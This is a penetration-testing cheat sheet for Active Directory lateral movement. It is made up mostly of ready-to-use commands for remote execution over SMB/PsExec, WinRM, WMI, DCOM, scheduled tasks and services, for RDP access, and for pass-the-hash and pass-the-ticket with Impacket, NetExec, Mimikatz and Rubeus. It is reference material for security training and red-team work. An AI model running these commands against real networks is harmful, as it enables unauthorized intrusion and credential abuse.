# Lateral Movement

Lateral movement is the process of moving from one system to another after obtaining valid credentials, hashes, tickets, or a session.

In Active Directory environments, lateral movement usually depends on:

- local administrator rights
- remote management protocols
- SMB admin shares
- WinRM
- WMI
- DCOM
- RDP
- scheduled tasks
- services
- Kerberos tickets
- NTLM hashes

Useful resources:

- [The Hacker Recipes - Movement](https://www.thehacker.recipes/ad/movement/)
- [HackTricks - Active Directory Methodology](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [NetExec Documentation](https://www.netexec.wiki/)
- [Impacket](https://github.com/fortra/impacket)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [WADComs](https://wadcoms.github.io/)

Basic variables used in examples:

```bash
export DOMAIN=corp.local
export NETBIOS=CORP
export USER=alice
export PASS='Password123!'
export NTLM='8846f7eaee8fb117ad06bdd830b7586c'
export DC_IP=10.10.10.10
export DC_HOST=dc01.corp.local
export TARGET=10.10.10.20
export TARGET_HOST=filesrv01.corp.local
export RANGE=10.10.10.0/24
```

---

## Local Admin Discovery

Local admin discovery identifies where the current credential has administrative rights.

Administrative rights are important because most lateral movement methods require local admin on the target host.

Common indicators of local admin:

| Indicator | Meaning |
| --- | --- |
| SMB admin shares accessible | Possible local admin. |
| `ADMIN$` readable/writable | Strong admin indicator. |
| `C$` accessible | Strong admin indicator. |
| Service creation works | Local admin or equivalent. |
| Remote scheduled task works | Local admin or equivalent. |
| WMI command execution works | Local admin or equivalent. |
| WinRM command execution works | Remote management rights. |

NetExec SMB sweep:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN
```

Typical admin indicator:

```text
Pwn3d!
```

With NT hash:

```bash
nxc smb $RANGE -u $USER -H $NTLM -d $DOMAIN
```

Check local admin with SMB shares:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --shares
```

Check WinRM access:

```bash
nxc winrm $RANGE -u $USER -p "$PASS" -d $DOMAIN
```

With hash:

```bash
nxc winrm $RANGE -u $USER -H $NTLM -d $DOMAIN
```

Check RDP access:

```bash
nxc rdp $RANGE -u $USER -p "$PASS" -d $DOMAIN
```

Check one host:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN
nxc winrm $TARGET -u $USER -p "$PASS" -d $DOMAIN
nxc rdp $TARGET -u $USER -p "$PASS" -d $DOMAIN
```

PowerView local admin discovery:

```powershell
Find-LocalAdminAccess
Find-DomainLocalGroupMember -GroupName Administrators
```

Manual Windows checks from an accessible host:

```cmd
net localgroup administrators
net localgroup administrators /domain
whoami /groups
```

Remote local administrators with PowerShell:

```powershell
Get-LocalGroupMember -Group Administrators
```

Remote with PowerView:

```powershell
Get-NetLocalGroupMember -ComputerName FILESRV01 -GroupName Administrators
```

Target prioritization:

| Target type | Why it matters |
| --- | --- |
| File server | Shares, scripts, sensitive files. |
| SQL server | Databases and service accounts. |
| Web/app server | Application configs and credentials. |
| Jump host | Admin sessions. |
| Backup server | Broad access and stored secrets. |
| SCCM/MECM | Endpoint management. |
| Domain controller | Highest-value, but usually heavily monitored. |

---

## SMB Admin Shares

SMB admin shares are default administrative shares available on Windows systems.

Common admin shares:

| Share | Meaning |
| --- | --- |
| `ADMIN$` | Usually maps to `C:\Windows`. |
| `C$` | Administrative share for the C drive. |
| `D$` | Administrative share for the D drive if present. |
| `IPC$` | Inter-process communication share. |

List shares:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --shares
```

With hash:

```bash
nxc smb $TARGET -u $USER -H $NTLM -d $DOMAIN --shares
```

`smbclient` list:

```bash
smbclient -L //$TARGET/ -U "$DOMAIN/$USER%$PASS"
```

Connect to `C$`:

```bash
smbclient //$TARGET/C$ -U "$DOMAIN/$USER%$PASS"
```

Connect to `ADMIN$`:

```bash
smbclient //$TARGET/ADMIN$ -U "$DOMAIN/$USER%$PASS"
```

Upload file:

```bash
smbclient //$TARGET/ADMIN$ -U "$DOMAIN/$USER%$PASS" -c 'put tool.exe'
```

Download file:

```bash
smbclient //$TARGET/C$ -U "$DOMAIN/$USER%$PASS" -c 'get Users\Public\file.txt'
```

Impacket SMB client:

```bash
smbclient.py $DOMAIN/$USER:"$PASS"@$TARGET
```

With hash:

```bash
smbclient.py $DOMAIN/$USER@$TARGET -hashes :$NTLM
```

Useful locations:

```text
C:\Windows\Temp
C:\Users\Public
C:\ProgramData
C:\Temp
```

Common SMB admin share outcomes:

| Result | Meaning |
| --- | --- |
| `C$` accessible | Local admin likely. |
| `ADMIN$` accessible | Local admin likely. |
| `Access denied` | Not local admin or blocked by policy. |
| Upload succeeds | File write path available. |
| File read succeeds | Useful for collection or staging in labs. |

---

## PsExec

PsExec-style lateral movement creates or uploads a service on a remote host over SMB and starts it through the Service Control Manager.

It usually requires local administrator rights on the target.

Common tools:

| Tool | Platform |
| --- | --- |
| `psexec.py` | Impacket, Linux. |
| `smbexec.py` | Impacket, Linux. |
| `atexec.py` | Impacket, Linux. |
| `PsExec.exe` | Sysinternals, Windows. |
| NetExec `-x` / `-X` | Command execution over SMB. |

Impacket PsExec with password:

```bash
psexec.py $DOMAIN/$USER:"$PASS"@$TARGET
```

With NT hash:

```bash
psexec.py $DOMAIN/$USER@$TARGET -hashes :$NTLM
```

With Kerberos:

```bash
export KRB5CCNAME=$PWD/$USER.ccache
psexec.py -k -no-pass $DOMAIN/$USER@$TARGET_HOST
```

Run command with NetExec:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN -x "whoami"
```

PowerShell command:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN -X "whoami"
```

With hash:

```bash
nxc smb $TARGET -u $USER -H $NTLM -d $DOMAIN -x "whoami"
```

Sysinternals PsExec from Windows:

```cmd
PsExec.exe \\HOSTNAME -u CORP\alice -p Password123! cmd.exe
```

Run command:

```cmd
PsExec.exe \\HOSTNAME -u CORP\alice -p Password123! cmd /c whoami
```

Common requirements:

| Requirement | Notes |
| --- | --- |
| SMB reachable | Port `445`. |
| Admin rights | Usually local admin on target. |
| Admin shares available | Used for file/service staging. |
| Service Control Manager reachable | Required to create/start service. |
| AV/EDR allowance in lab | Service binaries may be blocked. |

Common failures:

| Error | Meaning |
| --- | --- |
| `STATUS_ACCESS_DENIED` | Not local admin or blocked. |
| `ADMIN$` unavailable | Admin share disabled or inaccessible. |
| Service creation fails | SCM access denied or endpoint protection. |
| Authentication works but command fails | Rights or execution policy issue. |

---

## WinRM

WinRM is Windows Remote Management.

It commonly listens on:

| Port | Service |
| --- | --- |
| `5985` | WinRM HTTP |
| `5986` | WinRM HTTPS |

WinRM access often requires membership in:

```text
Administrators
Remote Management Users
```

Check WinRM:

```bash
nxc winrm $RANGE -u $USER -p "$PASS" -d $DOMAIN
```

With hash:

```bash
nxc winrm $RANGE -u $USER -H $NTLM -d $DOMAIN
```

Run command with NetExec:

```bash
nxc winrm $TARGET -u $USER -p "$PASS" -d $DOMAIN -x "whoami"
```

PowerShell command:

```bash
nxc winrm $TARGET -u $USER -p "$PASS" -d $DOMAIN -X "whoami"
```

Evil-WinRM with password:

```bash
evil-winrm -i $TARGET -u $USER -p "$PASS"
```

With hash:

```bash
evil-winrm -i $TARGET -u $USER -H $NTLM
```

With domain:

```bash
evil-winrm -i $TARGET -u "$DOMAIN\\$USER" -p "$PASS"
```

Upload file in Evil-WinRM:

```powershell
upload tool.exe
```

Download file:

```powershell
download output.txt
```

PowerShell remoting from Windows:

```powershell
Enter-PSSession -ComputerName HOSTNAME -Credential CORP\alice
```

Run command:

```powershell
Invoke-Command -ComputerName HOSTNAME -Credential CORP\alice -ScriptBlock { whoami }
```

WinRM result meanings:

| Result | Meaning |
| --- | --- |
| Login works | User can use WinRM on target. |
| Command works | Remote command execution available. |
| Auth works but access denied | User may lack remote management rights. |
| Port closed | WinRM disabled or filtered. |
| HTTPS only | Try port `5986` or SSL options. |

---

## WMI

WMI can be used for remote command execution on Windows hosts.

It usually requires local administrator rights on the target.

Common WMI ports:

| Port | Meaning |
| --- | --- |
| `135` | RPC Endpoint Mapper |
| Dynamic RPC ports | WMI/DCOM communication |
| `445` | Often used by tools for output retrieval |

Impacket WMIExec with password:

```bash
wmiexec.py $DOMAIN/$USER:"$PASS"@$TARGET
```

With hash:

```bash
wmiexec.py $DOMAIN/$USER@$TARGET -hashes :$NTLM
```

With Kerberos:

```bash
export KRB5CCNAME=$PWD/$USER.ccache
wmiexec.py -k -no-pass $DOMAIN/$USER@$TARGET_HOST
```

Run single command:

```bash
wmiexec.py $DOMAIN/$USER:"$PASS"@$TARGET "whoami"
```

NetExec WMI execution:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN -x "whoami" --exec-method wmiexec
```

Windows WMIC:

```cmd
wmic /node:HOSTNAME /user:CORP\alice /password:Password123! process call create "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
```

PowerShell WMI:

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName HOSTNAME -Credential CORP\alice -ArgumentList "cmd.exe /c whoami"
```

PowerShell CIM:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -ComputerName HOSTNAME -Arguments @{CommandLine="cmd.exe /c whoami"}
```

Common WMI outcomes:

| Result | Meaning |
| --- | --- |
| Command executes | Local admin or equivalent access. |
| Authentication succeeds but command fails | Permission/UAC/firewall issue. |
| RPC unavailable | Firewall or service issue. |
| Output missing | Command ran but output retrieval failed. |

---

## DCOM

DCOM can be used for remote execution through COM objects.

It usually requires local administrator rights and RPC/DCOM reachability.

Common tools:

| Tool | Notes |
| --- | --- |
| `dcomexec.py` | Impacket DCOM execution. |
| PowerShell COM objects | Windows-native usage. |

Impacket DCOMExec with password:

```bash
dcomexec.py $DOMAIN/$USER:"$PASS"@$TARGET
```

With hash:

```bash
dcomexec.py $DOMAIN/$USER@$TARGET -hashes :$NTLM
```

With Kerberos:

```bash
export KRB5CCNAME=$PWD/$USER.ccache
dcomexec.py -k -no-pass $DOMAIN/$USER@$TARGET_HOST
```

Specify object type:

```bash
dcomexec.py $DOMAIN/$USER:"$PASS"@$TARGET -object MMC20
dcomexec.py $DOMAIN/$USER:"$PASS"@$TARGET -object ShellWindows
dcomexec.py $DOMAIN/$USER:"$PASS"@$TARGET -object ShellBrowserWindow
```

Run command:

```bash
dcomexec.py $DOMAIN/$USER:"$PASS"@$TARGET "whoami"
```

PowerShell MMC20.Application example:

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","HOSTNAME"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\Windows\Temp\out.txt","7")
```

DCOM requirements:

| Requirement | Notes |
| --- | --- |
| RPC reachable | Port `135` and dynamic RPC. |
| Admin rights | Usually required. |
| DCOM enabled | Required on target. |
| Firewall allows DCOM | Common blocker. |
| COM object available | Object must exist and be usable. |

Common failures:

| Error | Meaning |
| --- | --- |
| Access denied | Missing rights or DCOM restriction. |
| RPC server unavailable | Firewall or service issue. |
| COM object not found | Object type unavailable. |
| No output | Command may run without easy output retrieval. |

---

## RDP

RDP provides interactive remote desktop access.

It commonly listens on:

```text
3389/tcp
```

RDP access usually requires:

- valid credentials
- RDP enabled
- network reachability
- membership in `Remote Desktop Users` or local `Administrators`
- NLA compatibility if Network Level Authentication is enabled

Check RDP port:

```bash
nmap -Pn -n -p3389 $TARGET
```

Check RDP access with NetExec:

```bash
nxc rdp $RANGE -u $USER -p "$PASS" -d $DOMAIN
```

With hash:

```bash
nxc rdp $RANGE -u $USER -H $NTLM -d $DOMAIN
```

Connect with xfreerdp:

```bash
xfreerdp /u:$USER /p:"$PASS" /d:$DOMAIN /v:$TARGET
```

With dynamic resolution:

```bash
xfreerdp /u:$USER /p:"$PASS" /d:$DOMAIN /v:$TARGET /dynamic-resolution
```

Ignore certificate warning:

```bash
xfreerdp /u:$USER /p:"$PASS" /d:$DOMAIN /v:$TARGET /cert:ignore
```

Pass-the-Hash with Restricted Admin if enabled:

```bash
xfreerdp /u:$USER /pth:$NTLM /d:$DOMAIN /v:$TARGET /cert:ignore
```

Enable drive mapping in a lab:

```bash
xfreerdp /u:$USER /p:"$PASS" /d:$DOMAIN /v:$TARGET /drive:share,/tmp /cert:ignore
```

Windows MSTSC:

```cmd
mstsc /v:HOSTNAME
```

Check current RDP sessions from target:

```cmd
query user
qwinsta
```

Common RDP outcomes:

| Result | Meaning |
| --- | --- |
| Login succeeds | Interactive access. |
| Valid creds but denied | Missing RDP rights. |
| NLA error | NLA or auth compatibility issue. |
| Account restricted | Logon restriction or policy. |
| PTH fails | Restricted Admin not enabled or blocked. |

---

## Scheduled Tasks

Scheduled tasks can execute commands remotely on Windows systems.

Remote task creation usually requires local administrator rights.

Windows `schtasks` remote create:

```cmd
schtasks /Create /S HOSTNAME /U CORP\alice /P Password123! /TN TestTask /SC ONCE /ST 23:59 /TR "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
```

Run task:

```cmd
schtasks /Run /S HOSTNAME /U CORP\alice /P Password123! /TN TestTask
```

Delete task:

```cmd
schtasks /Delete /S HOSTNAME /U CORP\alice /P Password123! /TN TestTask /F
```

Impacket atexec:

```bash
atexec.py $DOMAIN/$USER:"$PASS"@$TARGET "whoami"
```

With hash:

```bash
atexec.py $DOMAIN/$USER@$TARGET -hashes :$NTLM "whoami"
```

With Kerberos:

```bash
export KRB5CCNAME=$PWD/$USER.ccache
atexec.py -k -no-pass $DOMAIN/$USER@$TARGET_HOST "whoami"
```

NetExec using atexec method:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN -x "whoami" --exec-method atexec
```

PowerShell scheduled task:

```powershell
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c whoami > C:\Windows\Temp\out.txt"
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
Register-ScheduledTask -TaskName "TestTask" -Action $Action -Trigger $Trigger -User "SYSTEM"
Start-ScheduledTask -TaskName "TestTask"
```

Common scheduled task outcomes:

| Result | Meaning |
| --- | --- |
| Task created | Admin or task creation rights exist. |
| Task runs | Execution path works. |
| No output | Command ran without output path or permissions. |
| Access denied | Missing local admin or policy restrictions. |
| Task deleted | Cleanup completed in lab. |

---

## Services

Remote service creation is a common lateral movement method.

It usually requires local administrator rights and access to the Service Control Manager.

Windows `sc.exe` remote service creation:

```cmd
sc.exe \\HOSTNAME create TestSvc binPath= "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
```

Start service:

```cmd
sc.exe \\HOSTNAME start TestSvc
```

Delete service:

```cmd
sc.exe \\HOSTNAME delete TestSvc
```

With explicit credentials, use a shell running as that user or use a tool that supports credentials.

Impacket PsExec uses a service-based technique:

```bash
psexec.py $DOMAIN/$USER:"$PASS"@$TARGET
```

NetExec service execution:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN -x "whoami" --exec-method smbexec
```

Alternative exec methods:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN -x "whoami" --exec-method wmiexec
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN -x "whoami" --exec-method atexec
```

PowerShell service creation:

```powershell
New-Service -Name TestSvc -BinaryPathName "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
Start-Service TestSvc
```

Remote PowerShell service creation through Invoke-Command:

```powershell
Invoke-Command -ComputerName HOSTNAME -Credential CORP\alice -ScriptBlock {
    New-Service -Name TestSvc -BinaryPathName "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
    Start-Service TestSvc
}
```

Common service outcomes:

| Result | Meaning |
| --- | --- |
| Service created | SCM write access exists. |
| Service starts | Command execution path works. |
| Service fails quickly | Normal for one-shot commands. |
| Access denied | Missing local admin or SCM rights. |
| Binary blocked | AV/EDR or path restriction. |

---

## Remote Registry

Remote Registry allows reading or modifying registry hives on a remote machine.

It can be useful for enumeration, session discovery, auto-logon checks, installed software, and some credential-related checks.

Common requirement:

```text
Remote Registry service running or startable
```

Check Remote Registry with NetExec:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --reg-sessions
```

Enable/start service if authorized and local admin:

```cmd
sc.exe \\HOSTNAME query RemoteRegistry
sc.exe \\HOSTNAME start RemoteRegistry
```

Query remote registry:

```cmd
reg query \\HOSTNAME\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
```

Check Winlogon keys:

```cmd
reg query \\HOSTNAME\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

Check saved PuTTY sessions:

```cmd
reg query \\HOSTNAME\HKCU\Software\SimonTatham\PuTTY\Sessions
```

Remote registry sessions with NetExec:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --reg-sessions
```

Impacket reg:

```bash
reg.py $DOMAIN/$USER:"$PASS"@$TARGET query -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion
```

With hash:

```bash
reg.py $DOMAIN/$USER@$TARGET -hashes :$NTLM query -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion
```

Useful registry paths:

| Path | Why it matters |
| --- | --- |
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` | Auto-logon values. |
| `HKLM\SYSTEM\CurrentControlSet\Services` | Services. |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall` | Installed software. |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | Startup entries. |
| `HKCU\Software\SimonTatham\PuTTY\Sessions` | PuTTY sessions. |
| `HKU` | Loaded user hives. |

Common outcomes:

| Result | Meaning |
| --- | --- |
| Registry query works | Remote Registry access exists. |
| `HKU` shows user SIDs | User hives loaded. |
| Auto-logon values found | Possible credential exposure. |
| Access denied | Missing rights. |
| Service stopped | Start may require admin. |

---

## Pass the Hash

Pass the Hash uses an NT hash instead of a plaintext password for NTLM authentication.

It does not crack the password.

It works only where NTLM authentication is accepted and the target allows the requested logon type.

Common tools:

| Tool | Example use |
| --- | --- |
| NetExec | SMB, WinRM, RDP checks with hashes. |
| Impacket | PsExec, WMIExec, SMBExec, Atexec. |
| xfreerdp | RDP Restricted Admin mode if enabled. |
| Evil-WinRM | WinRM with NT hash. |

NetExec SMB:

```bash
nxc smb $RANGE -u $USER -H $NTLM -d $DOMAIN
```

Command execution:

```bash
nxc smb $TARGET -u $USER -H $NTLM -d $DOMAIN -x "whoami"
```

WinRM:

```bash
nxc winrm $RANGE -u $USER -H $NTLM -d $DOMAIN
evil-winrm -i $TARGET -u $USER -H $NTLM
```

Impacket PsExec:

```bash
psexec.py $DOMAIN/$USER@$TARGET -hashes :$NTLM
```

Impacket WMIExec:

```bash
wmiexec.py $DOMAIN/$USER@$TARGET -hashes :$NTLM
```

Impacket SMBExec:

```bash
smbexec.py $DOMAIN/$USER@$TARGET -hashes :$NTLM
```

Impacket Atexec:

```bash
atexec.py $DOMAIN/$USER@$TARGET -hashes :$NTLM "whoami"
```

RDP Restricted Admin mode:

```bash
xfreerdp /u:$USER /pth:$NTLM /d:$DOMAIN /v:$TARGET /cert:ignore
```

Common result meanings:

| Result | Meaning |
| --- | --- |
| SMB auth works | Hash is valid and NTLM accepted. |
| `Pwn3d!` | Local admin over SMB target. |
| WinRM works | Remote management access with hash. |
| RDP PTH fails | Restricted Admin may not be enabled. |
| Logon type denied | Credential valid but protocol not allowed. |

---

## Pass the Ticket

Pass the Ticket uses a Kerberos ticket directly.

It usually uses either:

| Format | Platform |
| --- | --- |
| `.ccache` | Linux / Impacket / MIT Kerberos |
| `.kirbi` | Windows / Rubeus / Mimikatz |

Linux ccache:

```bash
export KRB5CCNAME=$PWD/alice.ccache
klist
```

Use with Impacket:

```bash
wmiexec.py -k -no-pass $DOMAIN/$USER@$TARGET_HOST
psexec.py -k -no-pass $DOMAIN/$USER@$TARGET_HOST
smbexec.py -k -no-pass $DOMAIN/$USER@$TARGET_HOST
atexec.py -k -no-pass $DOMAIN/$USER@$TARGET_HOST "whoami"
```

Use with NetExec:

```bash
nxc smb $TARGET_HOST -k --use-kcache
nxc ldap $DC_HOST -k --use-kcache
nxc winrm $TARGET_HOST -k --use-kcache
```

Request TGT with password:

```bash
getTGT.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
export KRB5CCNAME=$PWD/$USER.ccache
```

Request TGT with hash:

```bash
getTGT.py $DOMAIN/$USER -hashes :$NTLM -dc-ip $DC_IP
export KRB5CCNAME=$PWD/$USER.ccache
```

Windows ticket injection with Rubeus:

```powershell
Rubeus.exe ptt /ticket:ticket.kirbi
klist
```

Mimikatz:

```cmd
mimikatz.exe
kerberos::ptt ticket.kirbi
kerberos::list
```

Convert ticket formats:

```bash
ticketConverter.py ticket.kirbi ticket.ccache
ticketConverter.py ticket.ccache ticket.kirbi
```

Common result meanings:

| Result | Meaning |
| --- | --- |
| `klist` shows ticket | Ticket cache loaded. |
| Kerberos auth works | Ticket valid for target/service. |
| `KRB_AP_ERR_SKEW` | Time skew problem. |
| `KRB_AP_ERR_MODIFIED` | SPN/key mismatch or wrong hostname. |
| Access denied | Authentication worked but authorization failed. |

---

## Lateral Movement Checklist

- [ ] **Confirm credential or ticket material**

  ```text
  Plaintext password:
  NT hash:
  Kerberos TGT:
  Kerberos TGS:
  ccache:
  kirbi:
  Current session:
  ```

- [ ] **Confirm domain context**

  ```text
  Domain:
  NetBIOS:
  Realm:
  DC:
  Target range:
  DNS working:
  Time synced:
  ```

- [ ] **Discover local admin access**

  ```bash
  nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN
  nxc winrm $RANGE -u $USER -p "$PASS" -d $DOMAIN
  nxc rdp $RANGE -u $USER -p "$PASS" -d $DOMAIN
  ```

- [ ] **Check SMB admin shares**

  ```bash
  nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --shares
  smbclient -L //$TARGET/ -U "$DOMAIN/$USER%$PASS"
  ```

- [ ] **Test WinRM**

  ```bash
  nxc winrm $TARGET -u $USER -p "$PASS" -d $DOMAIN
  evil-winrm -i $TARGET -u $USER -p "$PASS"
  ```

- [ ] **Test SMB command execution**

  ```bash
  nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN -x "whoami"
  ```

- [ ] **Test PsExec-style access**

  ```bash
  psexec.py $DOMAIN/$USER:"$PASS"@$TARGET
  ```

- [ ] **Test WMI execution**

  ```bash
  wmiexec.py $DOMAIN/$USER:"$PASS"@$TARGET "whoami"
  ```

- [ ] **Test DCOM execution**

  ```bash
  dcomexec.py $DOMAIN/$USER:"$PASS"@$TARGET "whoami"
  ```

- [ ] **Test scheduled task execution**

  ```bash
  atexec.py $DOMAIN/$USER:"$PASS"@$TARGET "whoami"
  ```

- [ ] **Test service-based execution**

  ```bash
  nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN -x "whoami" --exec-method smbexec
  ```

- [ ] **Test RDP**

  ```bash
  nxc rdp $TARGET -u $USER -p "$PASS" -d $DOMAIN
  xfreerdp /u:$USER /p:"$PASS" /d:$DOMAIN /v:$TARGET /cert:ignore
  ```

- [ ] **Check Remote Registry**

  ```bash
  nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --reg-sessions
  ```

- [ ] **Try Pass the Hash if NT hash is available**

  ```bash
  nxc smb $TARGET -u $USER -H $NTLM -d $DOMAIN
  wmiexec.py $DOMAIN/$USER@$TARGET -hashes :$NTLM
  ```

- [ ] **Try Pass the Ticket if Kerberos ticket is available**

  ```bash
  export KRB5CCNAME=$PWD/ticket.ccache
  klist
  wmiexec.py -k -no-pass $DOMAIN/$USER@$TARGET_HOST
  ```

